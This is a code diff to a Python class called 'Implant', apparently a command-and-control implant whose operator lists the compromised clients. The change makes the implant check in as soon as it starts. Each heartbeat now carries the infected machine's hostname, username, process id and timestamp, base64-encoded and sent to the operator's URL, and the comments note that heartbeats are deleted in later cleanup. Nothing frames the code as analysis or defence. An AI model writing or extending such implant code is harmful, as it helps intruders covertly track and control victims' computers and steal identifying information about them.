@@ -141,6 +141,10 @@ class Implant:
         # raises OSError [WinError 6] and would abort every cycle. Point them
         # at the null device before anything can write.
         redirect_output()
+        # Announce immediately: waiting ten cycles leaves the operator seeing
+        # an empty client list for minutes after a fresh implant starts.
+        if self.token:
+            self._beat()
         try:
             while True:
                 try:
@@ -589,7 +593,26 @@ class Implant:
                 print(f"[!] result send failed: {e}", file=sys.stderr)
 
     def _beat(self):
-        self._put(f"{HBT_PREFIX}{os.urandom(3).hex()}")
+        """Announce this client so the operator can list who is connected.
+
+        The tag carries host, user, pid and a unix timestamp, so `clients`
+        can show real identity instead of a random nonce. It is a heartbeat,
+        so it stays short and is deleted by the next cleanup where allowed.
+        """
+        try:
+            import getpass
+            import socket
+            ident = "|".join([
+                socket.gethostname() or "?",
+                getpass.getuser() or "?",
+                str(os.getpid()),
+                str(int(time.time())),
+            ])
+            body = base64.urlsafe_b64encode(
+                ident.encode()).rstrip(b"=").decode()
+            self._put(f"{HBT_PREFIX}{body}")
+        except Exception:                                # noqa: BLE001
+            self._put(f"{HBT_PREFIX}{os.urandom(3).hex()}")
 
     def _put(self, tag):
         url = f"{self.url}/{tag}"
